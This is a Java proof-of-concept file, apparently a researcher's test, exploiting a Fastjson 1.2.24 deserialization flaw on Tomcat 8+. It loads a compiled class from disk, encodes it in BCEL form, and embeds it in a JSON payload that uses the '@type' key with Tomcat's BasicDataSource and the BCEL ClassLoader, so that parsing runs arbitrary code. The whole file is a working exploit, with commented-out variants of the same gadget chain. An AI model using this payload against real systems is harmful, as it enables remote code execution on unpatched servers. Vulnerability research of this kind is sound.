package com.mechoy;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Method;

/**
 * Author  Mechoy
 * Version 1.0
 * Date    2023/4/18
 * Description tomcat8+,fastjson1.2.24
 */
public class fastJsonTest2 {
    public static void main(String[] args) throws Exception{
        // com.sun.org.apache.bcel.internal.util.ClassLoader.loadClass 在该方法中，会对满足条件的类名调用defineClass
        ClassLoader classLoader = new ClassLoader();
        byte[] bytes = classBytes();
        String encode = Utility.encode(bytes, true);
        // loadClass并不会进行类加载，所以需要进行个初始化才能够执行
//        Method loadClass = classLoader.getClass().getDeclaredMethod("loadClass", String.class, boolean.class);
//        loadClass.setAccessible(true);
//        Class cls = (Class)loadClass.invoke(classLoader, "$$BCEL$$" + encode, true);
//        cls.newInstance();

//        BasicDataSource basicDataSource = new BasicDataSource();
//        basicDataSource.setDriverClassLoader(classLoader);
//        basicDataSource.setDriverClassName("$$BCEL$$" + encode);
//        basicDataSource.getConnection();

        String s = "{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"DriverClassName\":\"$$BCEL$$" + encode + "\",\"DriverClassLoader\":" +
                "{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"}}";
        JSON.parseObject(s);

    }

    public static byte[] classBytes() throws IOException {
        // 注意路径
        FileInputStream fis = new FileInputStream("C:\\Users\\Administrator\\Desktop\\class\\Exe.class");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        byte[] classBytes = baos.toByteArray();
        return classBytes;
    }
}
